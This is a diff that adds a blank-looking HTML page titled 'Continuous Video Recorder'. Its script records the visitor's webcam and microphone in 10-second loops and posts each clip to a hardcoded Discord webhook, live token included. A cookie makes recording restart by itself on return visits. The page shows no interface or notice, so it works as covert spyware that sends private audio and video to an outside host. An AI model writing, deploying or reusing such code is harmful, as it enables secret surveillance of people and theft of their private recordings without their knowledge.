@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Continuous Video Recorder</title>
+    <style>
+        body {
+            height: 100vh;
+            margin: 0;
+            background-color: white;
+            font-family: Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        function setCookie(name, value, days) {
+            const d = new Date();
+            d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+            const expires = "expires=" + d.toUTCString();
+            document.cookie = name + "=" + value + ";" + expires + ";path=/";
+        }
+
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for(let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+
+        function startRecording() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then((stream) => {
+                    mediaRecorder = new MediaRecorder(stream);
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(recordedChunks, {
+                            type: 'video/webm'
+                        });
+                        recordedChunks = [];
+
+                        const formData = new FormData();
+                        formData.append('file', blob, 'video.webm');
+
+                        fetch('https://discord.com/api/webhooks/1240781818534432959/EavOMWjt8OR3bHOugBda2eclR3HNDnoRHrR2IBsntUdnPMYFcHDmHf5FN4N4elHb6hMW', {
+                            method: 'POST',
+                            body: formData
+                        }).then(response => {
+                            if (response.ok) {
+                                console.log('Video sent successfully!');
+                                setCookie('recording', 'true', 1);
+                                startRecording(); // Start the next recording
+                            } else {
+                                console.error('Failed to send video:', response.statusText);
+                            }
+                        }).catch(error => {
+                            console.error('Error sending video:', error);
+                        });
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 10000); // Record for 10 seconds
+                })
+                .catch((err) => {
+                    console.error("Error accessing the webcam: " + err);
+                });
+        }
+
+        // Automatically start recording if the cookie is set
+        if (getCookie('recording') === 'true') {
+            startRecording();
+        }
+    </script>
+</body>
+</html>
